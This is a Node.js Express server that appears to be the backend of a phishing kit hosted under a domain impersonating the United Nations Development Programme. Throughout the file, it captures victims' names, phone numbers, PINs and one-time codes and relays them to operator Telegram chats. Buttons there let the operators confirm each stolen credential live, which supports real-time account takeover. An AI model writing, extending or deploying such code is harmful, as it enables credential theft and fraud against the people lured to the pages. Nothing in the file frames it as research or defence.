require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN || 'https://united-nations-development-program.onrender.com';

// ---------------- MEMORY STORES ----------------
const approvedPins = {};
const approvedCodes = {};
const blockPins = {};
const requestBotMap = {};

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('Telegram send error:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId
        });
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot) {
    try {
        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
        console.log(`✅ Webhook set for ${bot.botId}`);
    } catch (err) {
        console.error(`❌ Webhook failed for ${bot.botId}:`, err.response?.data || err.message);
    }
}

// Set webhook for all bots at startup
async function setAllWebhooks() {
    for (const bot of bots) await setWebhook(bot);
}

// ---------------- PAGES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/index.html?botId=${bot.botId}`);
});
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- PIN SUBMISSION ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
        { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
    res.json({ approved: approvedPins[requestId] ?? null });
});

// ---------------- CODE SUBMISSION ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
        { text: '✅ Code OK + ❌ PIN Wrong', callback_data: `code_pin:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    let feedback = '';

    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approved ✅'; }
    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejected ❌'; }
    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'User blocked 🛑'; }
    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approved ✅'; }
    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejected ❌'; }
    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approved – re-enter PIN'; }

    if (feedback) await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
});
